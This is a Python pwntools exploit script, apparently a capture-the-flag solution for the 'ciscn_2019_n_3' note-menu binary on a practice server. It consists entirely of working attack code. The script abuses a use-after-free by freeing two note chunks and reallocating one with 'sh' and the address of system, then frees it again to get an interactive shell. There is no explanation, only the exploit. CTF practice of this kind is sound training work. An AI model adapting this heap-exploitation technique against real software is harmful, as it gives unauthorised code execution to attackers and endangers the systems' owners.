#coding:utf-8
from pwn import *
import pwnlib
sh = process("./ciscn_2019_n_3")
sh = remote("node3.buuoj.cn",28014)
elf = ELF("./ciscn_2019_n_3")
system_addr = elf.plt['system']
def add(index,size,content):
    sh.recvuntil("CNote > ")
    sh.sendline("1")
    sh.recvuntil("Index > ")
    sh.sendline(str(index))
    sh.recvuntil("Type > ")
    sh.sendline("2")
    sh.recvuntil("Length > ")
    sh.sendline(str(size))
    sh.recvuntil("Value > ")
    sh.sendline(content)

def dele(index):
    sh.recvuntil("CNote > ")
    sh.sendline("2")
    sh.recvuntil("Index > ")
    sh.sendline(str(index))

def show(index):
    sh.recvuntil("CNote > ")
    sh.sendline("3")
    sh.recvuntil("Index > ")
    sh.sendline(str(index))


add(0,0x10,"aaaa")
add(1,0x10,"aaaa")

dele(0)
dele(1)

add(3,0xc,"sh\x00\x00" + p32(system_addr))

dele(0)
sh.interactive()